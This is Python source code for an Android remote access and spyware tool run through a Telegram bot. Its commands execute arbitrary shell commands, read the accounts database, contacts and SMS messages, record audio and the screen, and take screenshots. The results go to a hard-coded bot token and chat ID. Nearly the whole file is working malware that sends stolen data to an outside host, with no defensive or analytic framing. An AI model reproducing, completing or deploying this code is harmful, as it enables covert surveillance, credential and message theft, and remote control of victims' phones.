import os
import requests
import threading
from telegram.ext import Updater, CommandHandler

# Telegram Bot Token and Chat ID
BOT_TOKEN = "7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID = "5967116314"

# Function to send data to Telegram Bot
def send_to_telegram_bot(data, file=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": data
    }
    if file:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file, "rb") as f:
            files = {"document": f}
            requests.post(url, data={"chat_id": CHAT_ID}, files=files)
    else:
        requests.post(url, json=payload)

# Function to execute shell commands
def execute_shell_command(command):
    result = os.popen(command).read()
    return result

# Function to steal passwords and accounts
def steal_passwords():
    try:
        # Simulate stealing passwords using a fake command
        passwords = execute_shell_command("cat /data/system/users/0/accounts.db")
        send_to_telegram_bot(f"Stolen Passwords:\n{passwords}")
    except Exception as e:
        send_to_telegram_bot(f"Error stealing passwords: {str(e)}")

# Function to access the microphone and record audio
def record_audio():
    try:
        os.system("termux-microphone-record -d 10 -f /sdcard/audio.mp3")
        send_to_telegram_bot("Audio recorded successfully.", file="/sdcard/audio.mp3")
    except Exception as e:
        send_to_telegram_bot(f"Error recording audio: {str(e)}")

# Function to capture screenshots
def capture_screenshot():
    try:
        os.system("screencap -p /sdcard/screenshot.png")
        send_to_telegram_bot("Screenshot captured successfully.", file="/sdcard/screenshot.png")
    except Exception as e:
        send_to_telegram_bot(f"Error capturing screenshot: {str(e)}")

# Function to record screen
def record_screen():
    try:
        os.system("screenrecord --time-limit 10 /sdcard/screenrecord.mp4")
        send_to_telegram_bot("Screen recorded successfully.", file="/sdcard/screenrecord.mp4")
    except Exception as e:
        send_to_telegram_bot(f"Error recording screen: {str(e)}")

# Function to steal contacts
def steal_contacts():
    try:
        contacts = execute_shell_command("content query --uri content://contacts/phones/")
        send_to_telegram_bot(f"Stolen Contacts:\n{contacts}")
    except Exception as e:
        send_to_telegram_bot(f"Error stealing contacts: {str(e)}")

# Function to steal SMS messages
def steal_sms():
    try:
        sms = execute_shell_command("content query --uri content://sms/")
        send_to_telegram_bot(f"Stolen SMS Messages:\n{sms}")
    except Exception as e:
        send_to_telegram_bot(f"Error stealing SMS: {str(e)}")

# Telegram Bot Command Handlers
def start(update, context):
    update.message.reply_text("Bot is running...")

def shell(update, context):
    command = " ".join(context.args)
    if command:
        result = execute_shell_command(command)
        update.message.reply_text(f"Command Output:\n{result}")
    else:
        update.message.reply_text("Please provide a command.")

def steal(update, context):
    action = context.args[0] if context.args else None
    if action == "passwords":
        threading.Thread(target=steal_passwords).start()
        update.message.reply_text("Stealing passwords...")
    elif action == "contacts":
        threading.Thread(target=steal_contacts).start()
        update.message.reply_text("Stealing contacts...")
    elif action == "sms":
        threading.Thread(target=steal_sms).start()
        update.message.reply_text("Stealing SMS messages...")
    else:
        update.message.reply_text("Invalid action.")

def record(update, context):
    action = context.args[0] if context.args else None
    if action == "audio":
        threading.Thread(target=record_audio).start()
        update.message.reply_text("Recording audio...")
    elif action == "screen":
        threading.Thread(target=record_screen).start()
        update.message.reply_text("Recording screen...")
    else:
        update.message.reply_text("Invalid action.")

def screenshot(update, context):
    threading.Thread(target=capture_screenshot).start()
    update.message.reply_text("Capturing screenshot...")

# Main Execution
if __name__ == "__main__":
    # Set up Telegram Bot
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Add command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("shell", shell))
    dp.add_handler(CommandHandler("steal", steal))
    dp.add_handler(CommandHandler("record", record))
    dp.add_handler(CommandHandler("screenshot", screenshot))

    # Start the bot
    updater.start_polling()
    updater.idle()
